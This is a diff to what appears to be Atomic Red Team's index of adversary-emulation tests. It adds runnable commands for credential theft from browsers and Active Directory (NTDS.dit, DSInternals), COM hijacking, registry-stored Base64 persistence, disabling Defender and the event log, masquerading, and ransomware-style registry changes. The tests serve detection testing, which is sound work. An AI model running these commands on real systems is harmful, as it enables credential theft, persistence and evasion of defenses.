@@ -997,7 +997,7 @@ credential-access:
 
 '
         get_prereq_command: |
-          /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)"
+          /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/e8114640740938c20cc41ffdbf07816b428afc49/install.sh)"
           brew install hudochenkov/sshpass/sshpass
       executor:
         name: bash
@@ -1558,11 +1558,46 @@ credential-access:
       executor:
         name: powershell
         command: 'Copy-Item "$env:APPDATA\Mozilla\Firefox\Profiles\" -Destination
-          $env:temp -Force
+          $env:temp -Force -Recurse
 
 '
-        cleanup_command: Remove-Item -Path "$env:temp\Profiles" -Force -ErrorAction
-          Ig
+        cleanup_command: 'Remove-Item -Path "$env:temp\Profiles" -Force -ErrorAction
+          Ignore -Recurse
+
+'
+    - name: Simulating access to Windows Edge Login Data
+      auto_generated_guid: a6a5ec26-a2d1-4109-9d35-58b867689329
+      description: |
+        Simulates an adversary accessing encrypted credentials from Edge web browser's login database.
+        more info in https://www.forensicfocus.com/articles/chromium-based-microsoft-edge-from-a-forensic-point-of-view/
+      supported_platforms:
+      - windows
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Edge must be installed
+
+'
+        prereq_command: if (Test-Path "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe")
+          {exit 0} else {exit 1}
+        get_prereq_command: '"Installation is not implemented as Edge is a part of
+          windows"
+
+'
+      - description: 'Edge login data file must exist
+
+'
+        prereq_command: if (Test-Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default")
+          {exit 0} else {exit 1}
+        get_prereq_command: "$edge=\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\"\nStart-Process
+          $edge \nStart-Sleep -s 20\nStop-Process -Name msedge\n"
+      executor:
+        name: powershell
+        command: 'Copy-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default" -Destination
+          $env:temp\Edge -Force -Recurse
+
+'
+        cleanup_command: Remove-Item -Path "$env:temp\Edge" -Force -ErrorAction Ignore
+          -Recurse
   T1552.002:
     technique:
       created: '2020-02-04T12:58:40.678Z'
@@ -1773,6 +1808,36 @@ credential-access:
           "exit"
 
 '
+    - name: Run DSInternals Get-ADReplAccount
+      auto_generated_guid: a0bced08-3fc5-4d8b-93b7-e8344739376e
+      description: "The following Atomic will run Get-ADReplAccount from DSInternals.\nUpon
+        successful execution, domain and credentials will appear in stdout. \n[Reference](https://www.crowdstrike.com/blog/observations-from-the-stellarparticle-campaign/)
+        CrowdStrike StellerParticle.\nhttps://www.dsinternals.com/en/retrieving-active-directory-passwords-remotely/\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        logonserver:
+          description: ComputerName argument default %logonserver%
+          type: String
+          default: $ENV:logonserver.TrimStart("\")
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'DSInternals must be installed
+
+'
+        prereq_command: |
+          $RequiredModule = Get-Module -Name DSInternals -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['DSInternals']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name DSInternals -Scope CurrentUser -Force
+
+'
+      executor:
+        command: 'Get-ADReplAccount -All -Server #{logonserver}
+
+'
+        name: powershell
+        elevation_required: false
   T1556.001:
     technique:
       external_references:
@@ -4339,6 +4404,45 @@ credential-access:
 '
         name: command_prompt
         elevation_required: true
+    - name: Create Volume Shadow Copy remotely (WMI) with esentutl
+      auto_generated_guid: 21c7bf80-3e8b-40fa-8f9d-f5b194ff2865
+      description: |
+        This test is intended to be run from a remote workstation with domain admin context.
+        The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy created with esentutl.
+      supported_platforms:
+      - windows
+      input_arguments:
+        source_path:
+          description: File to shadow copy
+          type: String
+          default: c:\windows\ntds\ntds.dit
+        target_path:
+          description: Target path of the result file
+          type: String
+          default: c:\ntds.dit
+        target_host:
+          description: IP Address / Hostname you want to target
+          type: String
+          default: localhost
+      dependencies:
+      - description: 'Target must be a reachable Domain Controller, and current context
+          must be domain admin
+
+'
+        prereq_command: 'wmic /node:"#{target_host}" shadowcopy list brief
+
+'
+        get_prereq_command: 'echo Sorry, can''t connect to target host, check: network,
+          firewall or permissions (must be admin on target)
+
+'
+      executor:
+        command: 'wmic /node:"#{target_host}" process call create "cmd.exe /c esentutl.exe
+          /y /vss #{source_path} /d #{target_path}"
+
+'
+        name: command_prompt
+        elevation_required: true
     - name: Create Volume Shadow Copy with Powershell
       auto_generated_guid: 542bb97e-da53-436b-8e43-e0a7d31a6c24
       description: |
@@ -4505,7 +4609,7 @@ credential-access:
           -v tshark)" ]; then exit 1; else exit 0; fi;
 
 '
-        get_prereq_command: "(which yum && yum -y epel-release tcpdump tshark)||(which
+        get_prereq_command: "(which yum && yum -y install epel-release tcpdump tshark)||(which
           apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y tcpdump tshark)\n"
       executor:
         command: |
@@ -4535,7 +4639,7 @@ credential-access:
           -v tshark)" ]; then exit 1; else exit 0; fi;
 
 '
-        get_prereq_command: "(which yum && yum -y epel-release tcpdump tshark)||(which
+        get_prereq_command: "(which yum && yum -y install epel-release tcpdump tshark)||(which
           apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y tcpdump tshark)\n"
       executor:
         command: "sudo tcpdump -c 5 -nnni #{interface}    \nif [ -x \"$(command -v
@@ -7787,7 +7891,7 @@ collection:
 
 '
         get_prereq_command: |
-          (which yum && yum -y epel-release zip)||(which apt-get && apt-get install -y zip)
+          (which yum && yum -y install epel-release zip)||(which apt-get && apt-get install -y zip)
           echo Please set input_files argument to include files that exist
       executor:
         name: sh
@@ -7893,8 +7997,8 @@ collection:
           ]; then exit 1; fi;
 
 '
-        get_prereq_command: "(which yum && yum -y epel-release zip gpg)||(which apt-get
-          && apt-get install -y zip gpg)\n"
+        get_prereq_command: "(which yum && yum -y install epel-release zip gpg)||(which
+          apt-get && apt-get install -y zip gpg)\n"
       executor:
         name: sh
         elevation_required: false
@@ -7958,6 +8062,20 @@ collection:
 
 '
         name: powershell
+    - name: Registry artefact when application use microphone
+      auto_generated_guid: 7a21cce2-6ada-4f7c-afd9-e1e9c481e44a
+      description: "[can-you-track-processes-accessing-the-camera-and-microphone](https://svch0st.medium.com/can-you-track-processes-accessing-the-camera-and-microphone-7e6885b37072)\n"
+      supported_platforms:
+      - windows
+      executor:
+        command: |
+          reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone\NonPackaged\C:#Windows#Temp#atomic.exe /v LastUsedTimeStart /t REG_BINARY /d a273b6f07104d601 /f
+          reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone\NonPackaged\C:#Windows#Temp#atomic.exe /v LastUsedTimeStop /t REG_BINARY /d 96ef514b7204d601 /f
+        cleanup_command: 'reg DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone\NonPackaged\C:#Windows#Temp#atomic.exe
+          /f
+
+'
+        name: command_prompt
   T1119:
     technique:
       created: '2017-05-31T21:31:27.985Z'
@@ -10218,7 +10336,22 @@ collection:
       - Praetorian
       x_mitre_version: '1.0'
       x_mitre_is_subtechnique: false
-    atomic_tests: []
+      identifier: T1125
+    atomic_tests:
+    - name: Registry artefact when application use webcam
+      auto_generated_guid: 6581e4a7-42e3-43c5-a0d2-5a0d62f9702a
+      description: "[can-you-track-processes-accessing-the-camera-and-microphone](https://svch0st.medium.com/can-you-track-processes-accessing-the-camera-and-microphone-7e6885b37072)\n"
+      supported_platforms:
+      - windows
+      executor:
+        command: |
+          reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam\NonPackaged\C:#Windows#Temp#atomic.exe /v LastUsedTimeStart /t REG_BINARY /d a273b6f07104d601 /f
+          reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam\NonPackaged\C:#Windows#Temp#atomic.exe /v LastUsedTimeStop /t REG_BINARY /d 96ef514b7204d601 /f
+        cleanup_command: 'reg DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam\NonPackaged\C:#Windows#Temp#atomic.exe
+          /f
+
+'
+        name: command_prompt
   T1056.003:
     technique:
       external_references:
@@ -11847,7 +11980,7 @@ privilege-escalation:
           $tempPath = cmd /c echo #{uacme_exe}
           if (Test-Path "$tempPath") {exit 0} else {exit 1}
         get_prereq_command: |
-          Invoke-WebRequest "https://github.com/justaseckev/atomic-red-team/raw/master/atomics/T1548.002/src/UACMe%20binaries.zip" -OutFile "$env:TEMP\uacme.zip"
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip" -OutFile "$env:TEMP\uacme.zip"
           Expand-Archive $env:TEMP\uacme.zip $env:TEMP\uacme -Force
           Remove-Item $env:TEMP\uacme.zip -Force
       executor:
@@ -11883,7 +12016,7 @@ privilege-escalation:
           $tempPath = cmd /c echo #{uacme_exe}
           if (Test-Path "$tempPath") {exit 0} else {exit 1}
         get_prereq_command: |
-          Invoke-WebRequest "https://github.com/justaseckev/atomic-red-team/raw/master/atomics/T1548.002/src/UACMe%20binaries.zip" -OutFile "$env:TEMP\uacme.zip"
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip" -OutFile "$env:TEMP\uacme.zip"
           Expand-Archive $env:TEMP\uacme.zip $env:TEMP\uacme -Force
           Remove-Item $env:TEMP\uacme.zip -Force
       executor:
@@ -11918,7 +12051,7 @@ privilege-escalation:
           $tempPath = cmd /c echo #{uacme_exe}
           if (Test-Path "$tempPath") {exit 0} else {exit 1}
         get_prereq_command: |
-          Invoke-WebRequest "https://github.com/justaseckev/atomic-red-team/raw/master/atomics/T1548.002/src/UACMe%20binaries.zip" -OutFile "$env:TEMP\uacme.zip"
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip" -OutFile "$env:TEMP\uacme.zip"
           Expand-Archive $env:TEMP\uacme.zip $env:TEMP\uacme -Force
           Remove-Item $env:TEMP\uacme.zip -Force
       executor:
@@ -11954,7 +12087,7 @@ privilege-escalation:
           $tempPath = cmd /c echo #{uacme_exe}
           if (Test-Path "$tempPath") {exit 0} else {exit 1}
         get_prereq_command: |
-          Invoke-WebRequest "https://github.com/justaseckev/atomic-red-team/raw/master/atomics/T1548.002/src/UACMe%20binaries.zip" -OutFile "$env:TEMP\uacme.zip"
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip" -OutFile "$env:TEMP\uacme.zip"
           Expand-Archive $env:TEMP\uacme.zip $env:TEMP\uacme -Force
           Remove-Item $env:TEMP\uacme.zip -Force
       executor:
@@ -11989,7 +12122,7 @@ privilege-escalation:
           $tempPath = cmd /c echo #{uacme_exe}
           if (Test-Path "$tempPath") {exit 0} else {exit 1}
         get_prereq_command: |
-          Invoke-WebRequest "https://github.com/justaseckev/atomic-red-team/raw/master/atomics/T1548.002/src/UACMe%20binaries.zip" -OutFile "$env:TEMP\uacme.zip"
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip" -OutFile "$env:TEMP\uacme.zip"
           Expand-Archive $env:TEMP\uacme.zip $env:TEMP\uacme -Force
           Remove-Item $env:TEMP\uacme.zip -Force
       executor:
@@ -12024,7 +12157,7 @@ privilege-escalation:
           $tempPath = cmd /c echo #{uacme_exe}
           if (Test-Path "$tempPath") {exit 0} else {exit 1}
         get_prereq_command: |
-          Invoke-WebRequest "https://github.com/justaseckev/atomic-red-team/raw/master/atomics/T1548.002/src/UACMe%20binaries.zip" -OutFile "$env:TEMP\uacme.zip"
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip" -OutFile "$env:TEMP\uacme.zip"
           Expand-Archive $env:TEMP\uacme.zip $env:TEMP\uacme -Force
           Remove-Item $env:TEMP\uacme.zip -Force
       executor:
@@ -12060,7 +12193,7 @@ privilege-escalation:
           $tempPath = cmd /c echo #{uacme_exe}
           if (Test-Path "$tempPath") {exit 0} else {exit 1}
         get_prereq_command: |
-          Invoke-WebRequest "https://github.com/justaseckev/atomic-red-team/raw/master/atomics/T1548.002/src/UACMe%20binaries.zip" -OutFile "$env:TEMP\uacme.zip"
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip" -OutFile "$env:TEMP\uacme.zip"
           Expand-Archive $env:TEMP\uacme.zip $env:TEMP\uacme -Force
           Remove-Item $env:TEMP\uacme.zip -Force
       executor:
@@ -12096,7 +12229,7 @@ privilege-escalation:
           $tempPath = cmd /c echo #{uacme_exe}
           if (Test-Path "$tempPath") {exit 0} else {exit 1}
         get_prereq_command: |
-          Invoke-WebRequest "https://github.com/justaseckev/atomic-red-team/raw/master/atomics/T1548.002/src/UACMe%20binaries.zip" -OutFile "$env:TEMP\uacme.zip"
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip" -OutFile "$env:TEMP\uacme.zip"
           Expand-Archive $env:TEMP\uacme.zip $env:TEMP\uacme -Force
           Remove-Item $env:TEMP\uacme.zip -Force
       executor:
@@ -12608,7 +12741,48 @@ privilege-escalation:
       - Elastic
       x_mitre_platforms:
       - Windows
-    atomic_tests: []
+      identifier: T1546.015
+    atomic_tests:
+    - name: COM Hijacking - InprocServer32
+      auto_generated_guid: 48117158-d7be-441b-bc6a-d9e36e47b52b
+      description: |-
+        This test uses PowerShell to hijack a reference to a Component Object Model by creating registry values under InprocServer32 key in the HKCU hive then calling the Class ID to be executed via rundll32.exe.
+
+        Reference: https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/
+      supported_platforms:
+      - windows
+      input_arguments:
+        clsid_threading:
+          description: Threading Model
+          type: string
+          default: Apartment
+        dllpath:
+          description: Path to the DLL.
+          type: String
+          default: "$env:TEMP\\AtomicTest.dll"
+        clsid:
+          description: Class ID to hijack.
+          type: string
+          default: "{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}"
+        clsid_description:
+          description: Description for CLSID
+          type: string
+          default: MSAA AccPropServices
+      dependency_executor_name: powershell
+      dependencies:
+      - description: DLL For testing
+        prereq_command: 'if (Test-Path #{dllpath}) {exit 0} else {exit 1}'
+        get_prereq_command: Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/bin/AtomicTest.dll"
+          -OutFile "#{dllpath}"
+      executor:
+        command: |-
+          New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}' -Value '#{clsid_description}'
+          New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}\InprocServer32' -Value #{dllpath}
+          New-ItemProperty -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}\InprocServer32' -Name 'ThreadingModel' -Value '#{clsid_threading}' -PropertyType "String"
+          Start-Process -FilePath "C:\Windows\System32\RUNDLL32.EXE" -ArgumentList '-sta #{clsid}'
+        cleanup_command: Remove-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}'
+          -Recurse -ErrorAction Ignore
+        name: powershell
   T1053.007:
     technique:
       external_references:
@@ -18244,6 +18418,28 @@ privilege-escalation:
           >$null 2>&1
 
 '
+    - name: Scheduled Task Executing Base64 Encoded Commands From Registry
+      auto_generated_guid: e895677d-4f06-49ab-91b6-ae3742d0a2ba
+      description: "A Base64 Encoded command will be stored in the registry (ping
+        127.0.0.1) and then a scheduled task will be created.\nThe scheduled task
+        will launch powershell to decode and run the command in the rgistry daily.\nThis
+        is a persistence mechanism recently seen in use by Qakbot.  \n\n[Additiona
+        Information](https://thedfirreport.com/2022/02/07/qbot-likes-to-move-it-move-it/)\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        time:
+          description: Daily scheduled task execution time
+          type: string
+          default: 27900
+      executor:
+        command: |
+          reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f
+          schtasks.exe /Create /F /TN "ATOMIC-T1053.005" /TR "cmd /c start /min \"\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))" /sc daily /st #{time}
+        cleanup_command: |
+          schtasks /delete /tn "ATOMIC-T1053.005" /F >nul 2>&1
+          reg delete HKCU\SOFTWARE\ATOMIC-T1053.005 /F >nul 2>&1
+        name: command_prompt
   T1053:
     technique:
       id: attack-pattern--35dd844a-b219-4e2b-a6bb-efa9a75995a9
@@ -19975,9 +20171,12 @@ privilege-escalation:
         command_to_add:
           description: Command to add to the .bash_profile file
           type: String
-          default: "/path/to/script.py"
+          default: echo "Hello from Atomic Red Team T1546.004"
       executor:
-        command: 'echo "#{command_to_add}" >> ~/.bash_profile
+        command: 'echo ''#{command_to_add}'' >> ~/.bash_profile
+
+'
+        cleanup_command: 'sed -i ''/#{command_to_add}/d'' ~/.bash_profile
 
 '
         name: sh
@@ -19993,9 +20192,12 @@ privilege-escalation:
         command_to_add:
           description: Command to add to the .bashrc file
           type: String
-          default: "/path/to/script.py"
+          default: echo "Hello from Atomic Red Team T1546.004"
       executor:
-        command: 'echo "#{command_to_add}" >> ~/.bashrc
+        command: 'echo ''#{command_to_add}'' >> ~/.bashrc
+
+'
+        cleanup_command: 'sed -i ''/#{command_to_add}/d'' ~/.bashrc
 
 '
         name: sh
@@ -21786,7 +21988,7 @@ defense-evasion:
           $tempPath = cmd /c echo #{uacme_exe}
           if (Test-Path "$tempPath") {exit 0} else {exit 1}
         get_prereq_command: |
-          Invoke-WebRequest "https://github.com/justaseckev/atomic-red-team/raw/master/atomics/T1548.002/src/UACMe%20binaries.zip" -OutFile "$env:TEMP\uacme.zip"
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip" -OutFile "$env:TEMP\uacme.zip"
           Expand-Archive $env:TEMP\uacme.zip $env:TEMP\uacme -Force
           Remove-Item $env:TEMP\uacme.zip -Force
       executor:
@@ -21822,7 +22024,7 @@ defense-evasion:
           $tempPath = cmd /c echo #{uacme_exe}
           if (Test-Path "$tempPath") {exit 0} else {exit 1}
         get_prereq_command: |
-          Invoke-WebRequest "https://github.com/justaseckev/atomic-red-team/raw/master/atomics/T1548.002/src/UACMe%20binaries.zip" -OutFile "$env:TEMP\uacme.zip"
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip" -OutFile "$env:TEMP\uacme.zip"
           Expand-Archive $env:TEMP\uacme.zip $env:TEMP\uacme -Force
           Remove-Item $env:TEMP\uacme.zip -Force
       executor:
@@ -21857,7 +22059,7 @@ defense-evasion:
           $tempPath = cmd /c echo #{uacme_exe}
           if (Test-Path "$tempPath") {exit 0} else {exit 1}
         get_prereq_command: |
-          Invoke-WebRequest "https://github.com/justaseckev/atomic-red-team/raw/master/atomics/T1548.002/src/UACMe%20binaries.zip" -OutFile "$env:TEMP\uacme.zip"
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip" -OutFile "$env:TEMP\uacme.zip"
           Expand-Archive $env:TEMP\uacme.zip $env:TEMP\uacme -Force
           Remove-Item $env:TEMP\uacme.zip -Force
       executor:
@@ -21893,7 +22095,7 @@ defense-evasion:
           $tempPath = cmd /c echo #{uacme_exe}
           if (Test-Path "$tempPath") {exit 0} else {exit 1}
         get_prereq_command: |
-          Invoke-WebRequest "https://github.com/justaseckev/atomic-red-team/raw/master/atomics/T1548.002/src/UACMe%20binaries.zip" -OutFile "$env:TEMP\uacme.zip"
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip" -OutFile "$env:TEMP\uacme.zip"
           Expand-Archive $env:TEMP\uacme.zip $env:TEMP\uacme -Force
           Remove-Item $env:TEMP\uacme.zip -Force
       executor:
@@ -21928,7 +22130,7 @@ defense-evasion:
           $tempPath = cmd /c echo #{uacme_exe}
           if (Test-Path "$tempPath") {exit 0} else {exit 1}
         get_prereq_command: |
-          Invoke-WebRequest "https://github.com/justaseckev/atomic-red-team/raw/master/atomics/T1548.002/src/UACMe%20binaries.zip" -OutFile "$env:TEMP\uacme.zip"
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip" -OutFile "$env:TEMP\uacme.zip"
           Expand-Archive $env:TEMP\uacme.zip $env:TEMP\uacme -Force
           Remove-Item $env:TEMP\uacme.zip -Force
       executor:
@@ -21963,7 +22165,7 @@ defense-evasion:
           $tempPath = cmd /c echo #{uacme_exe}
           if (Test-Path "$tempPath") {exit 0} else {exit 1}
         get_prereq_command: |
-          Invoke-WebRequest "https://github.com/justaseckev/atomic-red-team/raw/master/atomics/T1548.002/src/UACMe%20binaries.zip" -OutFile "$env:TEMP\uacme.zip"
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip" -OutFile "$env:TEMP\uacme.zip"
           Expand-Archive $env:TEMP\uacme.zip $env:TEMP\uacme -Force
           Remove-Item $env:TEMP\uacme.zip -Force
       executor:
@@ -21999,7 +22201,7 @@ defense-evasion:
           $tempPath = cmd /c echo #{uacme_exe}
           if (Test-Path "$tempPath") {exit 0} else {exit 1}
         get_prereq_command: |
-          Invoke-WebRequest "https://github.com/justaseckev/atomic-red-team/raw/master/atomics/T1548.002/src/UACMe%20binaries.zip" -OutFile "$env:TEMP\uacme.zip"
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip" -OutFile "$env:TEMP\uacme.zip"
           Expand-Archive $env:TEMP\uacme.zip $env:TEMP\uacme -Force
           Remove-Item $env:TEMP\uacme.zip -Force
       executor:
@@ -22035,7 +22237,7 @@ defense-evasion:
           $tempPath = cmd /c echo #{uacme_exe}
           if (Test-Path "$tempPath") {exit 0} else {exit 1}
         get_prereq_command: |
-          Invoke-WebRequest "https://github.com/justaseckev/atomic-red-team/raw/master/atomics/T1548.002/src/UACMe%20binaries.zip" -OutFile "$env:TEMP\uacme.zip"
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip" -OutFile "$env:TEMP\uacme.zip"
           Expand-Archive $env:TEMP\uacme.zip $env:TEMP\uacme -Force
           Remove-Item $env:TEMP\uacme.zip -Force
       executor:
@@ -24994,6 +25196,37 @@ defense-evasion:
 
 '
         name: command_prompt
+    - name: Makes Eventlog blind with Phant0m
+      auto_generated_guid: 3ddf3d03-f5d6-462a-ad76-2c5ff7b6d741
+      description: 'Use [Phant0m](https://github.com/hlldz/Phant0m) to disable Eventlog
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        file_name:
+          description: exe version of Phant0m
+          type: Path
+          default: PathToAtomicsFolder\T1562.002\bin\Phant0m.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Phant0m.exe must exist on disk at specified location (#{file_name})
+
+'
+        prereq_command: 'if (Test-Path #{file_name}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
+          New-Item -Type Directory (split-path #{file_name}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1562.002/bin/Phant0m.exe" -OutFile "#{file_name}" -UseBasicParsing
+      executor:
+        command: 'PathToAtomicsFolder\T1562.002\bin\Phant0m.exe
+
+'
+        cleanup_command: 'echo "Sorry you have to reboot"
+
+'
+        name: command_prompt
   T1562.007:
     technique:
       external_references:
@@ -25500,8 +25733,8 @@ defense-evasion:
         package_installer:
           description: Package installer command for linux. Default yum
           type: String
-          default: "(which yum && yum -y epel-release rsyslog)||(which apt-get &&
-            apt-get install -y rsyslog)"
+          default: "(which yum && yum -y install epel-release rsyslog)||(which apt-get
+            && apt-get install -y rsyslog)"
         flavor_command:
           description: Command to disable syslog collection. Default newer rsyslog
             commands. i.e older command = service rsyslog stop ; chkconfig off rsyslog
@@ -26089,6 +26322,45 @@ defense-evasion:
         command: Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove
           /NoRestart /quiet
         name: command_prompt
+        elevation_required: true
+    - name: Disable Defender with Defender Control
+      auto_generated_guid: 178136d8-2778-4d7a-81f3-d517053a4fd6
+      description: "Attempting to use Defender Control software to disable Windows
+        Defender. Upon successful execution, Windows Defender will be turned off.
+        \n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        DefenderID:
+          description: Defender ID that is used as a sort of passcode to disable it
+            within Defender Control from the command line. The machine-specific Defender
+            ID can be obtained within Defender Control by going to menu, command line
+            info, and then retrieving the 4 character passcode to continue (listed
+            after defendercontrol /d /id in the command line info window).
+          type: String
+          default: FFFF
+        DefenderControlExe:
+          description: Path to Defender Control software version 1.6.
+          type: String
+          default: "$env:temp\\DefenderControl\\DefenderControl\\DefenderControl.exe"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: "Defender Control must be installed on the machine. \n"
+        prereq_command: 'if (Test-Path #{DefenderControlExe}) {exit 0} else {exit
+          1}
+
+'
+        get_prereq_command: |
+          Start-BitsTransfer -Source "https://web.archive.org/web/20201210152711/https://www.sordum.org/files/download/defender-control/DefenderControl.zip" -Destination "$env:temp\defendercontrol.zip" -dynamic
+          expand-archive -LiteralPath "$env:temp\defendercontrol.zip" -DestinationPath "$env:temp\DefenderControl"
+      executor:
+        command: 'cmd /c #{DefenderControlExe} /D #{DefenderID} | Out-Null
+
+'
+        cleanup_command: 'cmd /c #{DefenderControlExe} /E | Out-Null
+
+'
+        name: powershell
         elevation_required: true
   T1078.002:
     technique:
@@ -30805,6 +31077,37 @@ defense-evasion:
           start %ALLUSERSPROFILE%\cmd.exe
         cleanup_command: del %ALLUSERSPROFILE%\cmd.exe >nul 2>&1
         name: command_prompt
+    - name: Malware Masquerading and Execution from Zip File
+      auto_generated_guid: 4449c89b-ec82-43a4-89c1-91e2f1abeecc
+      description: When the file is unzipped and the README.cmd file opened, it executes
+        and changes the .pdf to .dll and executes the dll. This is a BazaLoader technique
+        [as reported here](https://twitter.com/ffforward/status/1481672378639912960)
+      supported_platforms:
+      - windows
+      input_arguments:
+        url:
+          description: Location of zip file
+          type: Url
+          default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036/bin/T1036.zip
+      dependencies:
+      - description: Zip file must be present.
+        prereq_command: 'if (Test-Path $env:userprofile\Downloads\T1036.zip) {exit
+          0} else {exit 1}
+
+'
+        get_prereq_command: 'Invoke-WebRequest -OutFile "$env:userprofile\Downloads\T1036.zip"
+          #{url}
+
+'
+      executor:
+        command: |-
+          Expand-Archive -Path $env:userprofile\Downloads\T1036.zip -DestinationPath $env:userprofile\Downloads\T1036 -Force
+          cd $env:userprofile\Downloads\T1036
+          cmd /c $env:userprofile\Downloads\T1036\README.cmd >$null 2>$null
+        cleanup_command: |-
+          taskkill /IM Calculator.exe /f >$null 2>$null
+          Remove-Item $env:userprofile\Downloads\T1036 -recurse -ErrorAction Ignore
+        name: powershell
   T1036.005:
     technique:
       id: attack-pattern--1c4e5d32-1fe9-4116-9d9d-59e3925bd6a2
@@ -30889,6 +31192,36 @@ defense-evasion:
         cleanup_command: |
           rm -f $HOME/.../sh
           rmdir $HOME/.../
+    - name: Masquerade as a built-in system executable
+      auto_generated_guid: 35eb8d16-9820-4423-a2a1-90c4f5edd9ca
+      description: 'Launch an executable that attempts to masquerade as a legitimate
+        executable.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        executable_filepath:
+          description: File path where the generated executable will be dropped and
+            executed from. The filename should be the name of a built-in system utility.
+          type: String
+          default: "$Env:windir\\Temp\\svchost.exe"
+      executor:
+        command: |
+          Add-Type -TypeDefinition @'
+          public class Test {
+              public static void Main(string[] args) {
+                  System.Console.WriteLine("tweet, tweet");
+              }
+          }
+          '@ -OutputAssembly "#{executable_filepath}"
+
+          Start-Process -FilePath "#{executable_filepath}"
+        cleanup_command: 'Remove-Item -Path "#{executable_filepath}" -ErrorAction
+          Ignore
+
+'
+        name: powershell
   T1556:
     technique:
       external_references:
@@ -31234,6 +31567,54 @@ defense-evasion:
 
 '
         name: powershell
+    - name: BlackByte Ransomware Registry Changes - CMD
+      auto_generated_guid: 4f4e2f9f-6209-4fcf-9b15-3b7455706f5b
+      description: |
+        This task recreates the steps taken by BlackByte ransomware before it worms to other machines.  See "Preparing to Worm" section: https://redcanary.com/blog/blackbyte-ransomware/
+        The steps are as follows:
+        <ol>
+            <li>1. Elevate Local Privilege by disabling UAC Remote Restrictions</li>
+            <li>2. Enable OS to share network connections between different privilege levels</li>
+            <li>3. Enable long path values for file paths, names, and namespaces to ensure encryption of all file names and paths</li>
+        </ol>
+        The registry keys and their respective values will be created upon successful execution.
+      supported_platforms:
+      - windows
+      executor:
+        command: |
+          cmd.exe /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
